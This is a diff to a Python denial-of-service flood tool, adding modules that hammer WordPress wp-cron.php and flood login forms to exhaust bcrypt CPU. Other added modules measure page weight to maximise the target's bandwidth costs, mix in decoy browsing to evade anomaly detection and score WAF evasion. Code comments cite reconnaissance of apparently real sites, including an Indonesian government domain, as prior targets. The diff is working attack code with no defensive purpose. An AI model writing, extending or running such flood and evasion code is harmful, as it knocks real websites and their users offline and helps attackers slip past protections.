@@ -1630,6 +1630,160 @@ class AsyncHttpFlood(Thread):
         if int(REQUESTS_SENT) < 200:
             print(f"{bcolors.OKCYAN}[CHAOS WP-JSON] {len(wp_heavy_endpoints)} WordPress REST API attack endpoints loaded.{bcolors.RESET}")
 
+    def _chaos_wp_cron_exploitation(self):
+        """[V34] WordPress Cron Job Exploitation.
+        Deep recon of puskesjaten1 revealed: wp-cron.php returns 200 with 0 bytes in 96ms.
+        This means WP-Cron is OPEN and not protected. Each hit forces WordPress to:
+        1. Check ALL scheduled tasks (plugins, updates, emails)
+        2. Execute any pending tasks (CPU + DB heavy)
+        3. Even if no tasks pending, the cron check itself queries wp_options table.
+        By hammering wp-cron.php, we force continuous DB reads + potential task execution."""
+        intel = self._chaos_intel
+        if intel.get("cms_type") != "wordpress" or intel.get("infra_map", {}).get("wp_cron_checked"):
+            return
+            
+        if intel["total_executions"] == 20:
+            intel["infra_map"]["wp_cron_checked"] = True
+            try:
+                import urllib.request
+                req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/wp-cron.php?doing_wp_cron=1")
+                req.add_header('User-Agent', 'Mozilla/5.0')
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    if resp.status == 200:
+                        intel["wp_cron_available"] = True
+                        # Add wp-cron to high-priority attack endpoints
+                        cron_paths = [
+                            "/wp-cron.php?doing_wp_cron=1",
+                            "/wp-cron.php?doing_wp_cron=" + str(time()),
+                            "/wp-cron.php",
+                        ]
+                        for cp in cron_paths:
+                            intel["endpoints_discovered"].append(cp)
+                            intel["multi_path_queue"].append((cp, "GET"))
+                        if int(REQUESTS_SENT) < 500:
+                            print(f"{bcolors.OKGREEN}[CHAOS WP-CRON] wp-cron.php is OPEN! Cron exploitation endpoints loaded. DB stress amplified.{bcolors.RESET}")
+            except: pass
+
+    def _chaos_login_flood_discovery(self):   
+        """[V34] Login Endpoint Discovery & Flood Preparation.
+        Deep recon of konisolo.com revealed /login returns 200 (229ms).
+        Login forms are CPU-heavy because they:
+        1. Hash passwords (bcrypt = intentionally slow, ~100ms per attempt)
+        2. Query users table
+        3. Generate CSRF tokens
+        4. Write to session storage
+        By flooding login with random credentials, we force massive bcrypt CPU burn."""
+        intel = self._chaos_intel
+        if intel.get("login_endpoint") or intel.get("infra_map", {}).get("login_checked"):
+            return
+            
+        if intel["total_executions"] == 25:
+            intel["infra_map"]["login_checked"] = True
+            login_paths = ["/login", "/wp-login.php", "/admin/login", "/user/login", "/auth/login"]
+            
+            for path in login_paths:
+                try:
+                    import urllib.request
+                    req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}{path}")
+                    req.add_header('User-Agent', 'Mozilla/5.0')
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        if resp.status == 200:
+                            body = resp.read(2000).decode('utf-8', errors='ignore').lower()
+                            # Verify it's actually a login form (contains password field)
+                            if 'password' in body or 'passwd' in body or 'login' in body:
+                                intel["login_endpoint"] = path
+                                intel["endpoints_discovered"].append(path)
+                                intel["multi_path_queue"].append((path, "POST_DYN"))
+                                if int(REQUESTS_SENT) < 500:
+                                    print(f"{bcolors.WARNING}[CHAOS LOGIN-FLOOD] Login form found at {path}. Bcrypt CPU exhaustion vector activated.{bcolors.RESET}")
+                                break
+                except: continue
+
+    def _chaos_page_weight_analyzer(self):
+        """[V34] Page Weight Analysis.
+        Deep recon revealed hardosoloplast.com serves 273KB pages (3.5s response).
+        Heavy pages mean:
+        1. Server spends more CPU rendering
+        2. More bandwidth consumed per request (our attack costs target more $$)
+        3. Server memory fills faster with concurrent connections
+        If page > 100KB, even simple GET floods become devastatingly effective."""
+        intel = self._chaos_intel
+        if intel.get("page_weight_bytes") > 0 or intel["total_executions"] != 8:
+            return
+            
+        try:
+            import urllib.request
+            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            with urllib.request.urlopen(req, timeout=8) as resp:
+                body = resp.read()
+                intel["page_weight_bytes"] = len(body)
+                weight_kb = len(body) / 1024
+                
+                if weight_kb > 200:
+                    category = "EXTREMELY HEAVY"
+                elif weight_kb > 100:
+                    category = "HEAVY"
+                elif weight_kb > 50:
+                    category = "MODERATE"
+                else:
+                    category = "LIGHT"
+                    
+                if int(REQUESTS_SENT) < 100:
+                    print(f"{bcolors.OKCYAN}[CHAOS PAGE-WEIGHT] Page size: {weight_kb:.0f}KB ({category}). Each GET forces {weight_kb:.0f}KB egress from target.{bcolors.RESET}")
+                    
+                # Calculate bandwidth damage amplification
+                if weight_kb > 100:
+                    intel["infra_map"]["heavy_page"] = True
+                    intel["infra_map"]["page_kb"] = round(weight_kb)
+        except: pass
+
+    def _chaos_smart_decoy_traffic(self):
+        """[V34] Smart Decoy Traffic Generator.
+        Real attackers mix malicious traffic with legitimate-looking browsing.
+        This module generates realistic navigation patterns that:
+        1. Visit /robots.txt, /sitemap.xml (what real crawlers do)
+        2. Load static assets (.css, .js, images)  
+        3. Follow internal links naturally
+        This makes our traffic stream indistinguishable from real users + Googlebot."""
+        intel = self._chaos_intel
+        if intel.get("smart_decoy_paths"):
+            return
+            
+        if intel["total_executions"] == 12:
+            decoy_paths = [
+                "/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
+                "/about", "/contact", "/privacy-policy", "/terms",
+                "/category/", "/tag/", "/page/2", "/page/3",
+            ]
+            
+            # Add static asset paths that CDNs love to cache (makes us look legit)
+            static_decoys = [
+                "/wp-content/themes/style.css" if intel.get("cms_type") == "wordpress" else "/assets/css/app.css",
+                "/wp-includes/js/jquery/jquery.min.js" if intel.get("cms_type") == "wordpress" else "/js/app.js",
+            ]
+            
+            intel["smart_decoy_paths"] = decoy_paths + static_decoys
+            
+    def _chaos_waf_evasion_calculator(self):
+        """[V34] WAF Evasion Score Calculator.
+        Counts how many WAF protection layers we are currently bypassing."""
+        intel = self._chaos_intel
+        if intel["total_executions"] % 50 != 0:
+            return
+            
+        score = 0
+        if intel.get("shadow_protocol_active"): score += 20
+        if intel.get("quantum_state_active"): score += 15
+        if len(intel.get("fingerprint_pool", [])) > 0: score += 15
+        if intel.get("harvested_cookies", {}).get("XSRF-TOKEN"): score += 10
+        if intel.get("dead_drop_dns"): score += 10
+        if intel.get("psy_ops_active"): score += 10
+        if intel.get("multi_vector_active"): score += 10
+        if not intel.get("honeypot_detected"): score += 5
+        if intel.get("anomaly_score", 100) < 50: score += 5
+        intel["waf_evasion_score"] = min(score, 100)
+
     def _chaos_rate_limit_intelligence(self):
         """[V33] Rate-Limit Counter-Intelligence.
         Trained from surakarta.go.id: X-RateLimit-Remaining counts down (195->194->193...).
@@ -3600,6 +3754,13 @@ class HttpFlood(Thread):
         "honeypot_detected": False,       # Has the WAF router trapped us?
         "adaptive_threads": 500,          # Self-scaling thread boundaries
         "gti_match_score": 0,             # How similar this target is to past conquests
+        "wp_cron_available": False,        # Is wp-cron.php open? (puskesjaten1: YES, 0-byte 96ms)
+        "login_endpoint": None,            # Discovered login form endpoint (konisolo: /login 229ms)
+        "page_weight_bytes": 0,            # Baseline page size in bytes (hardosoloplast: 273KB!)
+        "decoy_traffic_ratio": 0.15,       # % of traffic that looks like normal browsing
+        "smart_decoy_paths": [],           # Paths used for legitimate-looking decoy traffic
+        "waf_evasion_score": 0,            # How many WAF checks we are currently evading
+        "attack_vector_diversity": 0,      # Number of distinct attack vectors in use
         "multi_vector_active": False,     # Are we launching orthogonal attacks simultaneously?
         "topology_mesh": {                # Deep map of discovered backend microservices
             "auth_endpoints": [],
@@ -5649,6 +5810,21 @@ class HttpFlood(Thread):
             # Laravel Livewire uses heavy POST AJAX calls - exploit this
             weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 85)
             
+        # === STRATEGY AI: WP-Cron Exploitation Boost (V34) ===
+        if intel.get("wp_cron_available"):
+            # wp-cron is open - GET floods on wp-cron.php force task execution
+            weights["GET"] = max(weights.get("GET", 0), 65)
+            
+        # === STRATEGY AJ: Login Bcrypt Exhaustion (V34) ===
+        if intel.get("login_endpoint"):
+            # Login endpoint exists - POST_DYN floods force bcrypt password hashing
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 80)
+            
+        # === STRATEGY AK: Decoy Traffic Injection (V34) ===
+        # Mix 15% of traffic as normal browsing to avoid anomaly detection
+        if intel.get("smart_decoy_paths") and randint(1, 100) <= 15:
+            weights["BOT"] = max(weights.get("BOT", 0), 40)  # BOT mimics real browsers
+
         # === STRATEGY AH: Heavy Page Detection (V33) ===
         # hardosoloplast has 273KB pages (3.5s response) - GET flood alone kills it
         baseline_ms = intel.get("response_time_ms", 100)
@@ -5907,6 +6083,11 @@ class HttpFlood(Thread):
         self._chaos_wp_plugin_vulnerability_scan()
         self._chaos_xmlrpc_status_check()
         self._chaos_response_timing_profiler()
+        self._chaos_wp_cron_exploitation()
+        self._chaos_login_flood_discovery()
+        self._chaos_page_weight_analyzer()
+        self._chaos_smart_decoy_traffic()
+        self._chaos_waf_evasion_calculator()
         self._chaos_rate_limit_intelligence()
         self._chaos_gov_id_heuristics()
         
@@ -6353,8 +6534,15 @@ class HttpFlood(Thread):
                 if intel.get("infra_map", {}).get("wp_plugins_scanned"): v32_mods.append("WP-Plugins-Mapped")
                 rl = intel.get("rate_limit_threshold")
                 if rl: v32_mods.append(f"RateLimit:{rl}")
+                page_kb = intel.get("page_weight_bytes", 0) // 1024
+                if page_kb > 0: v32_mods.append(f"PageWt:{page_kb}KB")
+                if intel.get("wp_cron_available"): v32_mods.append("WP-Cron-Exploit")
+                if intel.get("login_endpoint"): v32_mods.append(f"LoginFlood:{intel['login_endpoint']}")
+                evasion = intel.get("waf_evasion_score", 0)
+                vectors = len([m for m,w in weights.items() if w > 20]) if 'weights' in dir() else 0
                 if v32_mods:
                     print(f"  Field Intel : {bcolors.OKGREEN}{" | ".join(v32_mods)}{bcolors.RESET}")
+                print(f"  Evasion     : WAF Bypass Score: {evasion}% | Attack Vectors Active: {vectors}")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
